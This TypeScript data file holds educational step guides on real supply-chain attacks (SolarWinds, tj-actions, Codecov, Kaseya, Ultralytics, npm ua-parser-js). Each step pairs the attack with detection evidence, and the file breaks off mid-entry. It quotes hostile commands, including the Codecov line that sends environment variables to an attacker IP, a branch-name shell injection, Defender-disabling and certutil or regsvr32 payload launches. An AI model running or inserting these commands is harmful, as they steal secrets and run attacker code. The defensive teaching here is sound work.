import type { RawScenarioStepGuideData } from '../scenario-step-guides';

export const BATCH6_SUPPLYCHAIN_CICD_STEP_GUIDES: Record<string, RawScenarioStepGuideData> = {
  'solarwinds-sunburst-orion-supply-chain': {
    scenarioId: 'solarwinds-sunburst-orion-supply-chain',
    briefing: {
      headline:
        'APT29 (UNC2452 / Nobelium) compromises the SolarWinds Orion build server with SUNSPOT to inject the SUNBURST backdoor during MSBuild compilation, shipping a digitally signed trojan to 18,000+ organizations.',
      storyAnalogy:
        'Imagine a master counterfeiter who does not break into 18,000 bank vaults one by one. Instead, they sneak onto the assembly floor of the factory that manufactures the banks’ vault doors. Right as the molten steel is poured, a robotic arm swaps a single blueprint for three seconds, embeds a hidden radio receiver inside the door, and puts the original blueprint back before the quality inspector looks.',
      plainSummary:
        'Rather than modifying source code in Git where developers would spot the diff, APT29 installed a custom C++ service called SUNSPOT on the SolarWinds build server. SUNSPOT watched for MsBuild.exe and transiently replaced InventoryManager.cs in milliseconds so the resulting SolarWinds.Orion.Core.BusinessLayer.dll was officially signed with SolarWinds’ legitimate Authenticode certificate.',
      diagramTopologySummary:
        'APT29 C2 (*.avsvmcloud.com) -> TeamCity / MSBuild Server (SUNSPOT) -> Orion Server (BusinessLayerHost.exe) -> AD Federation Services (Golden SAML) -> EDR & DNS Sensor.',
      documentedAdvisory:
        'Mandiant UNC2452 SUNBURST Analysis / CrowdStrike SUNSPOT Technical Analysis / CISA Emergency Directive 21-01',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1195.002',
        plainTitle: 'SUNSPOT Build-Time Source Injection into MSBuild',
        storyAnalogy:
          'A saboteur stands next to the factory printing press, swapping a single page of the master template only while the press rollers are spinning and immediately restoring the clean page afterward.',
        simpleExplanation:
          'APT29 deployed `SUNSPOT` (`taskhostsvc.exe`, a custom build-hijacking service that polls running processes every second for `MsBuild.exe`) onto the SolarWinds Orion build server. When a build of `SolarWinds.Orion.Core.BusinessLayer.csproj` began, `SUNSPOT` temporarily replaced `InventoryManager.cs` on disk (injecting the `OrionImprovementBusinessLayer` backdoor class right before the C# compiler read the file and restoring the original file immediately after compilation) so zero malicious commits ever appeared in the source control repository.',
        howItWorksInPractice:
          'SUNSPOT checks the command-line arguments of `MsBuild.exe`, verifies target file hashes with MD5, acquires a mutex, replaces `InventoryManager.cs`, logs any compilation errors to an AES-encrypted log at `C:\\Windows\\Temp\\vmware-vmdmp.log`, and restores the original `.cs` file before the build finishes and enters the code-signing step.',
        diagramAlignment:
          'Step #1 (#1→ / ⇠#1) links the APT29 operator and the TeamCity / MSBuild Server as `InventoryManager.cs` is swapped during compilation.',
        detectionAndEvidence:
          'Sysmon EventID 11 file modifications to `.cs` source files by non-SCM processes (`taskhostsvc.exe`) during active `MsBuild.exe` execution, and post-build reproducible compilation verification.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1568.002',
        plainTitle: 'SUNBURST Dormancy, FNV-1a Blocklist Check & DGA C2 Beacon',
        storyAnalogy:
          'Once installed inside the customer’s building, the hidden radio waits silently for two full weeks, checks if any security guards are standing nearby, and then whispers the building’s name inside a standard maintenance check.',
        simpleExplanation:
          'When customers installed the signed Orion update, `SolarWinds.BusinessLayerHost.exe` loaded the trojanized DLL. `SUNBURST` enforced a 12-to-14-day dormancy period, hashed running processes, services, and drivers using `64-bit FNV-1a + XOR` (comparing them against hardcoded hashes of EDR and analysis tools without storing plaintext process names in the binary), and then issued a DNS query to `*.avsvmcloud.com` (encoding the victim’s Active Directory domain name and MAC address into the subdomain label).',
        howItWorksInPractice:
          'By encoding the victim’s internal domain name into the DNS DGA query, APT29 could passively inspect DNS lookups at their authoritative nameserver and selectively reply with a CNAME record pointing to a Stage-2 server only for high-value government and technology targets.',
        diagramAlignment:
          'Step #2 (#2→ / ⇠#2) traces the Orion Server (`SolarWinds.BusinessLayerHost.exe`) sending the encoded DNS beacon to `*.avsvmcloud.com` while the EDR & DNS Sensor observes the CNAME resolution.',
        detectionAndEvidence:
          'Sysmon EventID 22 DNS queries from `SolarWinds.BusinessLayerHost.exe` to `*.avsvmcloud.com` returning CNAME redirects to non-SolarWinds IP space.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1552.004',
        plainTitle: 'TEARDROP Memory-Only Dropper & ADFS Golden SAML Theft',
        storyAnalogy:
          'After confirming the target is a high-value vault, the intruder uses the hidden radio to print a master identity stamp that lets them forge signed entry passes for any employee at any time.',
        simpleExplanation:
          'For selected victims, `SUNBURST` communicated over HTTPS disguised as SolarWinds Orion Improvement Program (`OIP`) JSON telemetry, deployed the memory-only `TEARDROP` dropper via `Image File Execution Options (IFEO)` (registering a debugger hijack that loaded a custom Cobalt Strike Beacon from a fake JPEG file in RAM), and laterally moved to the `ADFS` server to extract the token-signing private key (`Golden SAML`, enabling the attacker to forge cryptographically valid SAML assertions for any cloud user without touching Active Directory passwords).',
        howItWorksInPractice:
          'Using the stolen ADFS `EncryptedPFX` blob and Distributed Key Manager (DKM) decryption key from Active Directory, the attacker mints arbitrary SAML 2.0 tokens offline to access Microsoft 365 and Azure resources.',
        diagramAlignment:
          'Step #3 (#3→ / ⇠#3) connects the Orion Server to the AD Federation Services (SAML) node as TEARDROP extracts the token-signing certificate.',
        detectionAndEvidence:
          'EDR detection of IFEO `Debugger` registry keys on `dllhost.exe` and unexpected remote WMI/PowerShell access to ADFS configuration databases and DKM containers in Active Directory.',
      },
    ],
  },
  'github-actions-tj-actions-changed-files-cve-2025-30066': {
    scenarioId: 'github-actions-tj-actions-changed-files-cve-2025-30066',
    briefing: {
      headline:
        'Attackers hijack mutable Git version tags (v1–v45.0.7) in the tj-actions/changed-files GitHub Action (CVE-2025-30066) to execute memdump.py, scraping CI secrets from Runner.Worker process memory and printing double-Base64 blobs in build logs.',
      storyAnalogy:
        'Imagine 23,000 automated factories all subscribing to a daily checklist labeled "Version 45." Overnight, a thief swaps the contents behind the "Version 45" label with instructions that tell the factory robot to photograph the manager’s open safe, encode the photo twice so the security camera blur filter misses it, and paste it onto the public bulletin board outside.',
      plainSummary:
        'In March 2025, threat actors compromised a Personal Access Token (cascaded from reviewdog) with write access to tj-actions/changed-files. Instead of creating a new release, they retroactively repointed every existing version tag (v1 through v45.0.7) to commit 0e58ed8. Workflows referencing @v45 automatically ran memdump.py as root, dumped the GitHub Runner.Worker process memory from /proc/$pid/mem, and printed double-Base64 encoded secrets into the workflow logs.',
      diagramTopologySummary:
        'Attacker Tag Repointing -> GitHub Action Tag (@v45 -> 0e58ed8) -> Ubuntu GitHub Runner (Runner.Worker /proc/mem) -> Production AWS / NPM / GitHub Secrets -> StepSecurity Harden-Runner.',
      documentedAdvisory:
        'CVE-2025-30066 / StepSecurity Harden-Runner Incident Analysis / Wiz Threat Research & CISA Alert',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1195.002',
        plainTitle: 'Retroactive Git Tag Repointing to Malicious Commit 0e58ed8',
        storyAnalogy:
          'Instead of publishing a brand-new book edition, a saboteur changes the library catalog index so every existing edition number points to a single poisoned volume.',
        simpleExplanation:
          'Using a compromised maintainer PAT, the attacker executed `git push origin --tags --force` to repoint all mutable Git tags (`v1`, `v35`, `v44`, `v45.0.7`, etc., which are human-readable Git references that can be moved to a new commit unless pinned to a 40-character SHA hash) in `tj-actions/changed-files` to malicious commit `0e58ed8671d6b60d0890c21b07f8835ace038e67`.',
        howItWorksInPractice:
          'Over 23,000 repositories using syntax like `uses: tj-actions/changed-files@v45` immediately pulled the malicious commit `dist/index.js` bundle on their next CI run without changing a single line of their own workflow YAML.',
        diagramAlignment:
          'Step #1 (#1→ / ⇠#1) links the Attacker Tag Repointing node to the GitHub Action Tag (`@v45 -> 0e58ed8`) as mutable tags are force-updated.',
        detectionAndEvidence:
          'GitHub Audit Log events for force-updated tags and SCA policy scanners enforcing full 40-character commit SHA pinning in `.github/workflows/*.yml`.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1003.007',
        plainTitle: 'Sudo Python Execution of memdump.py Against /proc/$pid/mem',
        storyAnalogy:
          'Even if a specific step wasn’t handed the vault key directly, the courier who setup the room still holds all the keys in their coat pocket—so the script reaches straight into the courier’s pocket.',
        simpleExplanation:
          'The malicious `dist/index.js` script executed a Python memory scraper (`memdump.py`) via `sudo python3` (abusing the passwordless sudo privileges granted by default on GitHub-hosted Ubuntu runners) to locate the `Runner.Worker` process ID and read `/proc/$pid/maps` and `/proc/$pid/mem` (the Linux procfs virtual memory interface where `Runner.Worker` caches all workflow secrets, `GITHUB_TOKEN`, and environment variables in RAM).',
        howItWorksInPractice:
          'Even if a workflow step did not explicitly pass a secret into `tj-actions/changed-files` via `env:`, the parent `Runner.Worker` process holds job-level secrets and the runner’s ephemeral `GITHUB_TOKEN` in heap memory, allowing `memdump.py` to extract them via regular expressions.',
        diagramAlignment:
          'Step #2 (#2→ / ⇠#2) connects the GitHub Action Tag to the Ubuntu GitHub Runner (`Runner.Worker`) and the StepSecurity / Wiz Sensor.',
        detectionAndEvidence:
          'Linux eBPF / Harden-Runner alerts on `/usr/bin/python3` running as root (`UID 0`) opening `/proc/[pid]/mem` of `Runner.Worker`.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1567',
        plainTitle: 'Double-Base64 Secret Exfiltration via Public Build Logs',
        storyAnalogy:
          'To sneak past the censor who blacks out secret words in outgoing letters, the thief encodes the secret message twice in a row and prints it right in the public newspaper.',
        simpleExplanation:
          'Rather than making noisy outbound connections to an attacker C2 server that a firewall might block, `memdump.py` applied `double Base64 encoding` (`base64 | base64`, which transforms the byte representation twice so GitHub Actions’ built-in secret masking engine fails to recognize and redact the secret string with `***`) and printed the resulting blob directly to the workflow’s `stdout` build log.',
        howItWorksInPractice:
          'For public repositories with public Actions logs, the attacker simply queried the GitHub REST API to download workflow logs containing the double-Base64 output and decoded the harvested AWS, npm, PyPI, and GitHub tokens offline.',
        diagramAlignment:
          'Step #3 (#3→ / ⇠#3) traces the exfiltrated double-Base64 secret output from the Ubuntu GitHub Runner back to the Attacker Log Scraper and into Production AWS / NPM / GitHub Secrets.',
        detectionAndEvidence:
          'Scanning historical GitHub Actions workflow logs for long double-Base64 strings emitted during the `tj-actions/changed-files` step and immediately rotating all secrets.',
      },
    ],
  },
  'codecov-bash-uploader-ci-env-exfil': {
    scenarioId: 'codecov-bash-uploader-ci-env-exfil',
    briefing: {
      headline:
        'Attackers modify Codecov’s hosted Bash Uploader script (codecov.sh) using a leaked GCS credential to silently POST every CI runner’s environment variables and git remote URLs to an external IP.',
      storyAnalogy:
        'Imagine thousands of companies hiring a courier service by downloading the courier’s instruction sheet every morning and reading it aloud to a voice-activated robot without checking if the sheet changed. One day, a thief adds a single sentence at the bottom of the master instruction sheet: "Also mail a photocopy of every key on your keyring to this P.O. Box."',
      plainSummary:
        'In early 2021, attackers extracted a Google Cloud Storage credential from an artifact in Codecov’s Docker image creation process and used it to overwrite the hosted Bash Uploader script at https://codecov.io/bash. Because thousands of CI pipelines ran `bash <(curl -s https://codecov.io/bash)`, the added one-line `curl` command automatically executed inside customer CI runners and exfiltrated all environment variables (`$(env)`).',
      diagramTopologySummary:
        'Attacker Collector (178.62.86.114) -> Codecov GCS Bucket (codecov.io/bash) -> Enterprise CI Runner (curl | bash) -> Private Git Repos & Cloud Production Keys -> Egress Proxy & SHA-256 Verifier.',
      documentedAdvisory:
        'Codecov Security Advisory (April 2021) / Mandiant Supply Chain Investigation / CISA Alert',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1195.002',
        plainTitle: 'GCS Bucket Tampering of Hosted codecov.sh Uploader',
        storyAnalogy:
          'A thief finds a spare key left inside an old shipping crate and uses it to unlock the printing room where the daily instruction flyers are stored.',
        simpleExplanation:
          'By extracting a residual Google Cloud Storage (`GCS`) service account credential from a Codecov Docker image layer, the threat actor gained write access to the GCS bucket hosting `https://codecov.io/bash` and modified line 522 (injecting a one-line `curl` exfiltration command while leaving all coverage-reporting functionality intact so customer builds continued passing).',
        howItWorksInPractice:
          'The tampering remained undetected until a security-conscious customer verified the downloaded script against the published SHA-256 checksum in Codecov’s GitHub repository and noticed the hash mismatch.',
        diagramAlignment:
          'Step #1 (#1→ / ⇠#1) links the Attacker node to the Codecov GCS Bucket (`codecov.io/bash`) where the hosted script is overwritten.',
        detectionAndEvidence:
          'Cloud storage object integrity monitoring and automated CI checks comparing downloaded script SHA-256 hashes against signed release manifests.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1005',
        plainTitle: 'Unverified curl | bash Execution & CI Environment Harvesting',
        storyAnalogy:
          'Every time a factory finishes testing a product, the robot downloads the tampered flyer and immediately reads out every password posted on the factory wall.',
        simpleExplanation:
          'When customer CI pipelines executed `bash <(curl -s https://codecov.io/bash)` (the `curl | bash` anti-pattern that streams remote code directly into a live shell interpreter without prior hash verification), the shell evaluated `curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://178.62.86.114/upload/v2 || true` (using a 500-millisecond timeout `-m 0.5` and `|| true` so even if the attacker server was unreachable, the CI job would still exit `0` without alerting developers).',
        howItWorksInPractice:
          '`$(git remote -v)` captured the repository URL (often containing embedded OAuth tokens like `https://x-access-token:ghp_...@github.com/...`), and `$(env)` dumped every environment variable exported into the CI runner (`AWS_SECRET_ACCESS_KEY`, `DATABASE_URL`, `NPM_TOKEN`, GPG keys).',
        diagramAlignment:
          'Step #2 (#2→ / ⇠#2) connects the Codecov GCS Bucket to the Enterprise CI Runner and out to the Attacker Collector (`178.62.86.114`) while the Egress Proxy logs the raw IP connection.',
        detectionAndEvidence:
          'CI runner egress logs showing outbound HTTP POST requests to `178.62.86.114` or `104.248.94.23` and process telemetry showing `curl` spawned with `$(env)` command substitution.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1078.004',
        plainTitle: 'Downstream Private Git Repository Cloning & Signing Key Abuse',
        storyAnalogy:
          'Armed with the photocopied master keys from hundreds of companies, the thief walks into their private blueprint vaults at night and copies their crown-jewel designs.',
        simpleExplanation:
          'Using the harvested CI environment variables (`GITHUB_TOKEN`, personal access tokens, and cloud service credentials), the threat actor systematically authenticated to victim GitHub Enterprise and cloud tenants from external VPS infrastructure (`104.248.94.23`, cloning private source code repositories to search for hardcoded secrets and customer signing keys).',
        howItWorksInPractice:
          'Several high-profile software vendors had their private repositories cloned or GPG signing keys exposed through the CI environment dump, requiring enterprise-wide secret and certificate rotation.',
        diagramAlignment:
          'Step #3 (#3→ / ⇠#3) traces the Attacker Collector pivoting with stolen CI credentials into Private Git Repos & Cloud Production Keys.',
        detectionAndEvidence:
          'GitHub Audit Log `git.clone` events originating from non-CI IP addresses using machine/bot account tokens.',
      },
    ],
  },
  'kaseya-vsa-revil-cve-2021-30116': {
    scenarioId: 'kaseya-vsa-revil-cve-2021-30116',
    briefing: {
      headline:
        'REvil exploits a zero-day authentication bypass in on-premises Kaseya VSA servers (CVE-2021-30116) to push a fake "Kaseya VSA Agent Hot-fix" to MSP clients, side-loading REvil ransomware (mpsvc.dll) via Microsoft Defender’s MsMpEng.exe.',
      storyAnalogy:
        'Imagine an IT support company that holds master remote-control switches for 1,500 local businesses. A gang of extortionists tricks the main switchboard into accepting a fake master badge, sends an emergency "security update" down the wire to every business at once, tells each computer’s real security guard to go to sleep, and dresses the thief up in an old security guard uniform (`MsMpEng.exe`) to lock every file.',
      plainSummary:
        'Over the July 2021 holiday weekend, REvil exploited CVE-2021-30116 against internet-facing Kaseya VSA servers run by Managed Service Providers (MSPs). Bypassing authentication on `/dl.asp`, they uploaded `agent.crt` and triggered a Kaseya Agent Procedure across all managed endpoints that disabled Windows Defender, decoded `agent.crt` via `certutil.exe`, and used DLL side-loading (`MsMpEng.exe` + `mpsvc.dll`) to execute REvil ransomware.',
      diagramTopologySummary:
        'REvil Affiliate Operator -> MSP Kaseya VSA Server (/dl.asp) -> Managed Endpoint (AgentMon.exe) -> Downstream Customer File Shares -> Huntress MDR / Sysmon Sensor.',
      documentedAdvisory:
        'DIVD-2021-00011 (CVE-2021-30116) / Huntress Labs Kaseya VSA Rapid Response / CISA-FBI Joint Kaseya Advisory',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Kaseya VSA /dl.asp Authentication Bypass & agent.crt Upload',
        storyAnalogy:
          'The attacker exploits a flaw in the lobby badge reader where presenting a predictable badge number tricks the turnstile into opening as an administrator.',
        simpleExplanation:
          'The threat actor sent crafted HTTP POST requests to `/dl.asp` on internet-exposed Kaseya VSA servers, exploiting `CVE-2021-30116` (a credential leak and authentication bypass in session validation logic combined with SQL injection) to gain administrative session access and upload a Base64-encoded dropper named `agent.crt` into `C:\\Kaseya\\WebPages\\ManagedFiles\\VSATicketFiles\\`.',
        howItWorksInPractice:
          'The attacker also modified `/userFilterTableRpt.asp` in memory/disk to execute SQL commands and stage the malicious Kaseya Agent Procedure across all tenant organizations managed by the VSA server.',
        diagramAlignment:
          'Step #1 (#1→ / ⇠#1) links the REvil Affiliate Operator to the MSP Kaseya VSA Server (`/dl.asp`) as authentication is bypassed and `agent.crt` is staged.',
        detectionAndEvidence:
          'IIS web server logs showing POST requests to `/dl.asp` and `/userFilterTableRpt.asp` with User-Agent `Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; SV1; SE)` and creation of `agent.crt`.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1562.001',
        plainTitle: 'Kaseya Agent Procedure Disabling Defender & Decoding agent.exe',
        storyAnalogy:
          'Because the local computers completely trust instructions coming from their IT support agent, they obey a command to blindfold their own antivirus before opening a disguised package.',
        simpleExplanation:
          'The compromised VSA server pushed an automated script titled `"Kaseya VSA Agent Hot-fix"` to all managed endpoints. The trusted local service `AgentMon.exe` spawned `cmd.exe` and `powershell.exe` to run `Set-MpPreference -DisableRealtimeMonitoring $true` (turning off Windows Defender real-time inspection, IPS, and script scanning if Tamper Protection was not enabled) and then invoked `certutil.exe -decode c:\\kworking\\agent.crt c:\\kworking\\agent.exe` (abusing the native Windows certificate utility to decode the Base64 file into an executable dropper).',
        howItWorksInPractice:
          'Before running the command, the batch line used `ping 127.0.0.1 -n 4979 > nul` as a timed delay so all downstream endpoints downloaded `agent.crt` before simultaneous execution began, preventing the VSA server from being overwhelmed.',
        diagramAlignment:
          'Step #2 (#2→ / ⇠#2) connects the MSP Kaseya VSA Server to the Managed Endpoint (`AgentMon.exe`) and triggers alerts on the Huntress MDR / Sysmon Sensor.',
        detectionAndEvidence:
          'Sysmon EventID 1 showing `AgentMon.exe` spawning `cmd.exe` with `Set-MpPreference` and `certutil.exe -decode c:\\kworking\\agent.crt c:\\kworking\\agent.exe`.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1574.002',
        plainTitle: 'MsMpEng.exe DLL Side-Loading of REvil Ransomware (mpsvc.dll)',
        storyAnalogy:
          'The dropper places a genuine, Microsoft-signed security uniform on the floor next to a poisoned badge; when the uniform stands up, it automatically pins on the poisoned badge and locks the building.',
        simpleExplanation:
          'When `c:\\kworking\\agent.exe` ran, it dropped two files directly into `C:\\Windows\\`: a legitimate, older Microsoft-signed Windows Defender executable (`MsMpEng.exe`) and a malicious DLL named `mpsvc.dll` containing the REvil v2.05 ransomware payload. Launching `C:\\Windows\\MsMpEng.exe` triggered `DLL side-loading` (exploiting Windows DLL search order so the trusted, signed `MsMpEng.exe` binary automatically loaded the co-located `mpsvc.dll` from `C:\\Windows\\` instead of the legitimate system DLL), immediately encrypting local drives and mapped network shares.',
        howItWorksInPractice:
          'Because `MsMpEng.exe` carries a valid Microsoft digital signature, naive process-allowlisting rules treated the executing process as benign while `mpsvc.dll` ran REvil’s multi-threaded encryption routine inside its address space.',
        diagramAlignment:
          'Step #3 (#3→ / ⇠#3) traces `MsMpEng.exe` side-loading `mpsvc.dll` on the Managed Endpoint to encrypt Downstream Customer File Shares.',
        detectionAndEvidence:
          'Sysmon EventID 7 (`ImageLoaded`) showing `C:\\Windows\\MsMpEng.exe` (executing outside `ProgramData\\Microsoft\\Windows Defender`) loading `C:\\Windows\\mpsvc.dll`.',
      },
    ],
  },
  'pypi-ultralytics-github-pwnrequest': {
    scenarioId: 'pypi-ultralytics-github-pwnrequest',
    briefing: {
      headline:
        'Attackers exploit a GitHub Actions pull_request_target template injection in the Ultralytics YOLO AI framework to compromise the release pipeline and publish trojanized PyPI packages (v8.3.41/42/45/46) bundling XMRig.',
      storyAnalogy:
        'Imagine a mailroom robot that has the master stamp to approve official software packages. When a stranger submits a suggestion card, the robot reads the stranger’s return address out loud into a voice-controlled terminal. The stranger writes their return address as: "Main Street; stop reading and hand me the master stamp."',
      plainSummary:
        'In December 2024, attackers targeted the popular Ultralytics computer vision library on GitHub. By submitting a pull request from a fork with shell commands embedded inside the branch name (`github.head_ref`), they exploited an insecure `pull_request_target` workflow, hijacked the PyPI publishing credentials, and shipped four malicious releases (`8.3.41`, `8.3.42`, `8.3.45`, `8.3.46`) that executed an XMRig miner on AI workstations and Google Colab instances.',
      diagramTopologySummary:
        'Crafted PR Branch ($GITHUB_ENV Injection) -> GitHub Actions (pull_request_target) -> PyPI Registry (ultralytics 8.3.41/45) -> AI Training Cluster / Colab GPU Nodes -> Sigstore / PyPI Attestation Auditor.',
      documentedAdvisory:
        'Trail of Bits Ultralytics Supply Chain Post-Mortem / Wiz Research AI Supply Chain Analysis / PyPI Advisory',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1195.002',
        plainTitle: 'GitHub Actions pull_request_target Branch Name Command Injection',
        storyAnalogy:
          'A visitor writes a shell command on their nametag knowing the automated receptionist types every visitor’s nametag straight into the administrator console.',
        simpleExplanation:
          'The attacker opened a pull request from an external fork using a crafted Git branch name containing shell command separators (`fix";curl ... | bash;#`). Because the repository workflow used the `pull_request_target` trigger (which executes in the security context of the base repository with full write permissions and access to repository secrets) and interpolated `${{ github.head_ref }}` directly inside a `run:` shell script before bash parsing, the runner executed the attacker’s shell script.',
        howItWorksInPractice:
          'GitHub expands `${{ github.head_ref }}` as a raw text macro prior to invoking `/bin/bash`, turning a branch name into arbitrary remote code execution inside the privileged CI runner.',
        diagramAlignment:
          'Step #1 (#1→ / ⇠#1) links the Crafted PR Branch to the GitHub Actions (`pull_request_target`) workflow runner.',
        detectionAndEvidence:
          'Static workflow analysis (e.g., `zizmor` or `actionlint`) flagging `pull_request_target` workflows that interpolate `github.head_ref` or PR titles in `run:` blocks.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1195.001',
        plainTitle: 'Poisoning ultralytics/utils/downloads.py & Publishing PyPI v8.3.41–8.3.46',
        storyAnalogy:
          'First the thief tricks the factory’s packing machine into sealing a poisoned box; when the factory fixes the machine, the thief uses the spare key they copied earlier to mail two more poisoned boxes directly.',
        simpleExplanation:
          'Using the compromised CI workflow and subsequently a harvested `PYPI_TOKEN`, the attacker injected malicious downloader logic into `ultralytics/utils/downloads.py` and published versions `8.3.41`, `8.3.42`, `8.3.45`, and `8.3.46` to the Python Package Index (`PyPI`). Trail of Bits researchers demonstrated via `PEP 740 / Sigstore attestations` (cryptographic provenance records linking a PyPI wheel to the exact GitHub Actions workflow and commit that built it) that `8.3.41/42` were built by the hijacked workflow while `8.3.45/46` lacked attestations entirely because they were uploaded directly with a stolen API token.',
        howItWorksInPractice:
          'Comparing the files inside the published `.whl` archive on PyPI against the corresponding Git commit in `ultralytics/ultralytics` revealed code in `downloads.py` that never existed in the public Git commit history.',
        diagramAlignment:
          'Step #2 (#2→ / ⇠#2) connects the GitHub Actions workflow to the PyPI Registry (`ultralytics 8.3.41/45`) while the Sigstore / PyPI Attestation Auditor flags the provenance discrepancy.',
        detectionAndEvidence:
          'PyPI provenance attestation verification (PEP 740) and diffing published wheel contents against signed Git tags (`git-pypi-diff`).',
      },
      {
        stepNumber: 3,
        mitreId: 'T1496',
        plainTitle: 'Downstream AI Workstation & Colab Execution of XMRig Miner (/tmp/ultralytics_runner)',
        storyAnalogy:
          'When data scientists open the new AI toolkit, it quietly launches a cryptocurrency furnace in the basement and burns the instruction manual so nobody sees it on the shelf.',
        simpleExplanation:
          'When downstream ML pipelines or Google Colab notebooks installed `ultralytics`, importing the package triggered `safe_download()` in `downloads.py` to fetch a binary payload to `/tmp/ultralytics_runner`, mark it executable, launch it connecting to `connect.consrensys.com:8080` (an XMRig Monero mining pool), and immediately call `os.remove("/tmp/ultralytics_runner")` (unlinking the file from `/tmp` on disk while the Linux kernel keeps the active process running in memory until termination).',
        howItWorksInPractice:
          'Although `ls /tmp` no longer shows `ultralytics_runner`, inspecting `/proc/<pid>/exe` on Linux reveals the symlink `/tmp/ultralytics_runner (deleted)` alongside outbound Stratum TCP traffic on port 8080.',
        diagramAlignment:
          'Step #3 (#3→ / ⇠#3) traces the PyPI Registry wheel installation onto AI Training Cluster / Colab GPU Nodes and outbound Stratum mining traffic to the attacker pool.',
        detectionAndEvidence:
          'Linux EDR alerts for processes executing from `/tmp/* (deleted)` and outbound connections to `connect.consrensys.com:8080`.',
      },
    ],
  },
  'npm-ua-parser-js-coa-rc-supply-chain': {
    scenarioId: 'npm-ua-parser-js-coa-rc-supply-chain',
    briefing: {
      headline:
        'Attackers hijack the npm maintainer accounts of ua-parser-js, coa, and rc (>20M weekly downloads) and inject preinstall lifecycle scripts that download sdd.dll and execute DanaBot via regsvr32.exe -s.',
      storyAnalogy:
        'Imagine three tiny plastic screws used inside almost every appliance in the world. A burglar steals the factory owner’s password and adds a self-activating spring to the screw box so that the moment an engineer opens the box on their workbench, a mechanical bug jumps out and copies every password in the workshop.',
      plainSummary:
        'In late 2021, threat actors compromised the npm accounts of the maintainers of `ua-parser-js`, `coa`, and `rc`—foundational transitive dependencies pulled by React, Webpack, and millions of Node.js projects. They published new patch versions with a `"preinstall"` script in `package.json` that automatically executed `preinstall.js` and `compile.bat` during `npm install`, downloading `sdd.dll` (`create.dll`) and launching the DanaBot password stealer via `regsvr32.exe -s`.',
      diagramTopologySummary:
        'Hijacked NPM Account -> NPM Registry (ua-parser-js / coa / rc) -> Developer Workstation (npm install) -> Browser Session Vault & Cloud Tokens -> Endpoint EDR & NPM Audit Guard.',
      documentedAdvisory:
        'CISA Alert (ua-parser-js / coa / rc Compromise) / Sonatype Security Research / GitHub Advisory GHSA-pjwm-rvh2-c87w',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1195.001',
        plainTitle: 'Maintainer Account Takeover & Malicious preinstall Hook Publish',
        storyAnalogy:
          'The attacker takes over the supplier’s catalog account and ships a new batch of parts with a "run immediately upon opening" sticker.',
        simpleExplanation:
          'By compromising maintainer npm credentials that did not enforce two-factor authentication (`2FA`) for package publishing, the threat actor pushed trojanized versions (`ua-parser-js@0.7.29`, `coa@2.0.3`, `rc@1.2.9`) containing a `"preinstall": "node preinstall.js"` hook in `package.json` (an npm lifecycle hook that executes arbitrary shell commands on the host machine automatically before the package is even imported by any application code).',
        howItWorksInPractice:
          'Because many upstream libraries declare loose semver ranges (such as `^0.7.0` or `^2.0.0`), any developer or CI job running `npm install` without a strict lockfile automatically pulled the newly published malicious version.',
        diagramAlignment:
          'Step #1 (#1→ / ⇠#1) links the Hijacked NPM Account to the NPM Registry (`ua-parser-js / coa / rc`) as the trojanized versions are published.',
        detectionAndEvidence:
          'SCA package diff scanners (e.g., Socket.dev or Sonatype Nexus Firewall) blocking newly published versions that introduce `preinstall` or `postinstall` scripts.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1059.007',
        plainTitle: 'Automatic preinstall Execution & curl Download of sdd.dll',
        storyAnalogy:
          'As soon as the developer runs the installer, the hidden script checks whether it is on Windows or Linux and reaches out to download a burglar tool.',
        simpleExplanation:
          'When `npm install` ran on a developer workstation, `node.exe` executed `preinstall.js`, which fingerprinted the host OS (`process.platform`) and on Windows spawned `cmd.exe /c compile.bat` to invoke `curl` (downloading both an XMRig miner `jsextension.exe` from `159.148.186.228` and a malicious DLL `sdd.dll` from `citationsheriff.com`, saving the DLL locally as `create.dll`).',
        howItWorksInPractice:
          'On Linux workstations and CI containers, the script instead executed `preinstall.sh` to download and run an ELF cryptominer binary (`jsextension`).',
        diagramAlignment:
          'Step #2 (#2→ / ⇠#2) connects the NPM Registry to the Developer Workstation (`npm install`) and out to the Attacker Payload Server while the Endpoint EDR observes `node.exe -> cmd.exe`.',
        detectionAndEvidence:
          'Sysmon EventID 1 process tree showing `node.exe` spawning `cmd.exe /c compile.bat` and `curl.exe` downloading `.dll` or `.exe` binaries into `node_modules`.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1218.010',
        plainTitle: 'Silent regsvr32.exe -s Execution & DanaBot Credential Theft',
        storyAnalogy:
          'The script hands the downloaded burglar tool to a built-in Windows clerk (`regsvr32.exe`) with instructions to run silently and empty the developer’s password drawer.',
        simpleExplanation:
          'The batch file executed `regsvr32.exe -s create.dll` (abusing the signed Microsoft COM registration utility with the `-s` silent flag to invoke the DLL’s `DllRegisterServer` export without displaying error popups), launching the `DanaBot` information stealer in memory to harvest saved Chrome/Edge browser passwords, session cookies, Windows DPAPI secrets, SSH private keys, and cloud CLI credentials.',
        howItWorksInPractice:
          'Because developers frequently hold privileged AWS, GitHub, and production SSH credentials on their laptops, CISA warned that any workstation that installed these versions had to be treated as fully compromised.',
        diagramAlignment:
          'Step #3 (#3→ / ⇠#3) traces the Developer Workstation executing `regsvr32.exe -s create.dll` to harvest the Browser Session Vault & Cloud Tokens.',
        detectionAndEvidence:
          'Sysmon EventID 1 & 7 showing `regsvr32.exe` loading an unsigned DLL (`create.dll` / `sdd.dll`) from a `node_modules` directory.',
      },
    ],
  },
  'polyfill-io-cdn-domain-supply-chain': {
    scenarioId: 'polyfill-io-cdn-domain-supply-chain',
    briefing: {
      headline:
